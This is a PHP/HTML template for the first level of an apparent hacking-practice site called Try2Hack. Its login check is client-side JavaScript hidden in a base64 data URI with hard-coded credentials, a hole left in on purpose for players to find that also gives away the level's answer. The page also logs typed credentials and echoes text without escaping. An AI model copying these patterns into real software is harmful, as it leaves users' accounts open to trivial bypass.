<!DOCTYPE html>
<html lang="en">
<head>
    <title>Try2hack</title>
    <!-- Bootstrap core CSS -->
    <link href="<?php echo asset($frontAssetDir.'css/bootstrap.min.css') ?>" rel="stylesheet">
    <link href="<?php echo asset($frontAssetDir.'css/custom.css') ?>" rel="stylesheet">
    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="<?php echo asset($frontAssetDir.'js/bootstrap.js') ?>"></script>
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
	<!-- Add fancyBox main JS and CSS files -->
	<script type="text/javascript" src="<?php echo asset(str_replace('dist/','',$frontAssetDir.'source/jquery.fancybox.js')) ?>"></script>
	<link rel="stylesheet" type="text/css" href="<?php echo asset(str_replace('dist/','',$frontAssetDir.'source/jquery.fancybox.css')) ?>" media="screen" />
</head>
<body>
<!-- Login bar start -->
<div class="navbar navbar-default navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="#">Try2Hack</a>
        </div>
        <center>
            <div class="navbar-collapse collapse" id="navbar-main"> 
		<ul class="nav navbar-nav">
		<?php foreach ($level->suggestions as $suggestion) { ?>
                    <li><a class="fancybox" href="#suggestion<?php echo $suggestion->id; ?>"><?php echo $suggestion->title; ?></a>
                    </li>
		<?php } ?>
                </ul>
        <?php if (!Sentry::check()) { ?>


                <form class="navbar-form navbar-right" role="search" action="login.html" method="post">
                    <div class="form-group">
                        <input type="text" class="form-control" name="email" placeholder="Email">
                    </div>
                    <div class="form-group">
                        <input type="text" class="form-control" name="password" placeholder="Password">
                    </div>
                    <button type="submit" class="btn btn-default">Sign In</button>
                </form>

        <?php } else { ?>
            <div class="nav navbar-nav navbar-right" style="padding-top: 15px;">
                    Logged in as
                    <?php echo Sentry::getUser()->first_name ?>
                    <?php echo Sentry::getUser()->last_name ?>. <a href="logout.html">Logout?</a>
            </div>
        <?php } ?>
            </div>
        </center>
    </div>
</div>
<!-- Login bar end -->
<div class="container" style="padding-top:50px">
    <div class="row">
        <div class="col-sm-6 col-md-4 col-md-offset-4">
            <h1 class="text-center login-title">Sign in to go to next level (now 1)</h1>

            <div class="account-wall">
                <img class="profile-img"
                     src="https://lh5.googleusercontent.com/-b0-k99FZlyE/AAAAAAAAAAI/AAAAAAAAAAA/eu7opA4byxI/photo.jpg?sz=120"
                     alt="">

                <form class="form-signin" id="login-form">
                    <input type="text" class="form-control" placeholder="Login" id="login" required autofocus>
                    <input type="password" class="form-control" placeholder="Password" id="password" required autofocus
                           style="margin-top: 10px">
                    <button class="btn btn-lg btn-primary btn-block" type="submit">
                        Login
                    </button>
                </form>
            </div>
        </div>
    </div>
</div>

<?php foreach ($level->suggestions as $suggestion) { ?>
<div id="suggestion<?php echo $suggestion->id; ?>" style="width:100%;display: none;">
<h3><?php echo $suggestion->title; ?></h3>
<p>
<?php echo nl2br($suggestion->text); ?>
</p>
</div>
<?php } ?>

<?php if (Sentry::check()) { ?>
<script type="text/javascript">
    $( "#login-form" ).submit(function( event ) {
        var login = $("#login");
        var password = $("#password");
        if (login.val()!=undefined && password.val()!=undefined && login.val()!='' && password.val()!='') {
            $.post( "<?php echo $log_file?>", { 'login': login.val(), 'password': password.val() } );
        }
    });
</script>
<?php } ?>
<script type="text/javascript" src="data:text/javascript;base64,ICQoICIjbG9naW4tZm9ybSIgKS5zdWJtaXQoZnVuY3Rpb24oIGV2ZW50ICkgew0KICAgICAgICB2YXIgbG9naW4gPSAkKCIjbG9naW4iKTsNCiAgICAgICAgdmFyIHBhc3N3b3JkID0gJCgiI3Bhc3N3b3JkIik7DQogICAgICAgIGlmICgobG9naW4udmFsKCk9PSdoYWNrZXInKSAmJiAocGFzc3dvcmQudmFsKCk9PSd2dWtoZicpKSB7DQogICAgICAgICAgICBpZihjb25maXJtKCdMb2dpbiBzdWNlc3NmdWwsIGNvbnRpbnVlIHRvIG5leHQgbGV2ZWwnKSkgew0KICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2xldmVsMi5waHAnOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgYWxlcnQoJ05vdCB0aGlzIHRpbWUnKTsNCiAgICAgICAgICAgIGxvZ2luLnZhbCgnJyk7DQogICAgICAgICAgICBwYXNzd29yZC52YWwoJycpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9KTs="></script>
<script>
    $(document).ready(function() {
        $('.fancybox').fancybox();
    });
</script>
</body>
</html>
